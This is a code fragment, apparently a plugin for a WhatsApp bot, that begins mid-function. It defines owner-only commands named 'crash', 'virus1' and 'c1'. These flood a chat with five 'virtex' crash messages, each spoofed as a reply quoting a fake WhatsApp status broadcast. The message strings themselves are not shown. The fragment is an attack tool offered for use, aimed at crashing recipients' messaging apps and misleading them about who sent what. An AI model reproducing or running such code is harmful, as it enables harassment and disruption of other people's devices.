...
conn.fakeReply(m.chat, virtex, '0@s.whatsapp.net', '🔥 *VynaaChan* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex2, '0@s.whatsapp.net', '🔥 *VynaaChan* 🔥', 'status@broadcast')
conn.sendPresenceUpdate('recording', m.chat)
conn.fakeReply(m.chat, virtex3, '0@s.whatsapp.net', '🔥 *VynaaChan* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex4, '0@s.whatsapp.net', '🔥 *VynaaChan* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex5, '0@s.whatsapp.net', '🔥 *VynaaChan* 🔥', 'status@broadcast')
conn.sendPresenceUpdate('recording', m.chat)}
handler.help = ['crash']
handler.tags =['bug']
handler.command = ['virus1', 'c1', 'crash'] 
handler.owner = true
